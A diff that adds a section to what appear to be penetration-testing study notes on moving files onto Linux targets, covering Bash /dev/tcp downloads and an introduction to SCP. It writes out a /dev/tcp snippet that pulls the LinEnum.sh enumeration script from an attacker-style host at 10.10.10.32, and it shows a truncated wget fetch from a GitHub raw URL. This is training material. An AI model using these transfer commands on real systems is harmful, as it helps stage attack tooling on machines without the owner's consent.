@@ -85,3 +85,20 @@ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/
 ## Download with Bash (/dev/tcp)
 There may also be situations where none of the well-known file transfer tools are available. As long as Bash version 2.04 or greater is installed (compiled with --enable-net-redirections), the built-in /dev/TCP device file can be used for simple file downloads.
 
+```shell
+exec 3<>/dev/tcp/10.10.10.32/80
+echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
+cat <&3
+```
+
+![](../../Attachements/Pasted%20image%2020260726220726.png)
+
+## SSH Downloads
+
+SSH (or Secure Shell) is a protocol that allows secure access to remote computers. SSH implementation comes with an `SCP` utility for remote file transfer that, by default, uses the SSH protocol.
+
+`SCP` (secure copy) is a command-line utility that allows you to copy files and directories between two hosts securely. We can copy our files from local to remote servers and from remote servers to our local machine.
+
+`SCP` is very similar to `copy` or `cp`, but instead of providing a local path, we need to specify a username, the remote IP address or DNS name, and the user's credentials.
+
+Before we begin downloading files from our target Linux machine to our Pwnbox, let's set up an SSH server in our Pwnbox.
